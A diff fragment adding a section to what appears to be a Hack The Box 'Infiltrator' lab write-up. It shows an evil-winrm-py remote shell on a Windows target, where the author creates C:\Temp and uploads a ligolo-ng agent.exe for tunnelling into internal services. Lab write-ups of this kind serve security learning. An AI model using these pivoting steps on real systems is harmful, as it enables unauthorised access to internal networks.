@@ -536,6 +536,40 @@ Im going to use ligolo to access these internal services from my machine
 
 # Setting up ligolo-ng to access internal services
 
+Ill first grab the agent and the proxy from the github releases page
+
+```python
+evil-winrm-py PS C:\> mkdir Temp
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+d-----        10/5/2026   9:17 AM                Temp                                                                   
+
+
+evil-winrm-py PS C:\> cd Temp
+evil-winrm-py PS C:\Temp> upload ligolo/agent.exe .
+Uploading /home/kali/htb/Infiltrator/ligolo/agent.exe: 7.06MB [00:14, 520kB/s]                               
+[+] File uploaded successfully as: C:\Temp\agent.exe
+evil-winrm-py PS C:\Temp> dir
+
+
+    Directory: C:\Temp
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-a----        10/5/2026   9:17 AM        7374848 agent.exe                                                              
+
+
+evil-winrm-py PS C:\Temp>
+```
+
+Ill upload the agent to the target
+
 
 
 
